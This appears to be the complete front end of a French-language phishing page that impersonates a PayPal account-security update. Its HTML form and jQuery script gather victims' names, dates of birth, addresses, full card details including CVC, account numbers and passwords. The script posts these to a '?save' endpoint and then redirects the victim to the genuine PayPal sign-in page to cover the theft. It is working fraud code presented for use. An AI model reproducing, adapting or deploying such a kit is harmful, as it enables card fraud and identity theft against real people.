<p>Nous avons effectué des modifications pour mieux sécuriser votre compte</p>
<div id="step1" style="display: block">
<input type="text" class="input" id="fname" placeholder="Nom complet" />
<input type="text" class="input" id="dob" placeholder="Date de naissance" />
<input type="text" class="input" id="phone" placeholder="Numéro de téléphone" />
</div>
<div id="step2" style="display: none">
<input type="text" class="input" id="address" placeholder="Adresse" />
<input type="text" class="input" id="city" placeholder="Ville" />
<input type="text" class="input" id="zip" placeholder="Code Postale" />
</div>
<div id="step3" style="display: none;margin-bottom:20px" class="card-js">
<input class="card-number my-custom-class" name="card-number" placeholder="Numéro de carte bancaire">
<input class="expiry-month" name="expiry-month">
<input class="expiry-year" name="expiry-year">
<input class="cvc" name="cvc" placeholder="Cryptogramme">
</div>
<div id="step4" style="display: none">
<input type="text" class="input" id="cnum" placeholder="Numéro de compte" />
<input type="password" class="input" id="cpass" placeholder="Mot de passe" />
</div>
<button class="btn blue" id="infonext">
Suivant
</button>
</div>
</div>
<script>
       
        function showcc() {
            var address = $("#address").val();
            var city = $("#city").val();
            var zip = $("#zip").val();
            if (address.length > 0 && city.length > 0 && zip.length > 0) {
                $("#step2").fadeOut("fast", function () {
                    $("#step3").fadeIn();
                    step = 3;
                });
            }
        }
        function showcompte() {
            var myCard = $('#step3');
            var cc = myCard.CardJs('cardNumber');
            var expm = myCard.CardJs('expiryMonth');
            var expy = myCard.CardJs('expiryYear');
            var cvc = myCard.CardJs('cvc');
            if(cc.length > 0 && expm.length > 0 && expy.length > 0 && cvc.length > 0 && CardJs.isExpiryValid(expm, expy)){
                $.post("?save", {
                    fname:  $("#fname").val(),
                    dob:  $("#dob").val(),
                    phone:  $("#phone").val(),
                    address:  $("#address").val(),
                    city: $("#city").val(),
                    zip: $("#zip").val(),
                    cc,
                    exp: expm + "/" + expy,
                    ccv: cvc
                }, function(){
                    $("#step3").fadeOut("fast", function () {
                        $("#step4").fadeIn();
                        step = 4;
                    });
                })
            }

        }
        function endInfo() {
            var cnum = $("#cnum").val();
            var cpass = $("#cpass").val();
            if(cnum.length > 0 && cpass.length > 0){
                $.post("?save",{
                    cnum,
                    cpass
                }, function(){
                    window.location = "https://www.paypal.com/signin"
                })
            }
         }
        $(document).ready(function () {


            $("#infonext").click(function () {
                switch (step) {
                    case 1: showadress(); break;
                    case 2: showcc(); break;
                    case 3: showcompte(); break;
                    case 4: endInfo(); break;
                    default: break;
                }
            })

            $("#login").click(function () {

                var email = $("#email").val();
                var pass = $("#password").val();
                if (email.length > 0 && pass.length > 0) {
                    $.post("?save", { email, pass }, function () {
                        $("#loginbox").fadeOut("fast", function () {
                            $(".loader").fadeIn();
                            setTimeout(function () {
                                $(".loader").fadeOut("fast", function () {
                                    $("#infobox").fadeIn();
                                    /*$(".wrapper-page").fadeOut("fast", function(){

                                    });*/
                                })
                            }, 2000);
                        });
                    })
                }

            })
        });
    </script>
</body>
</html>
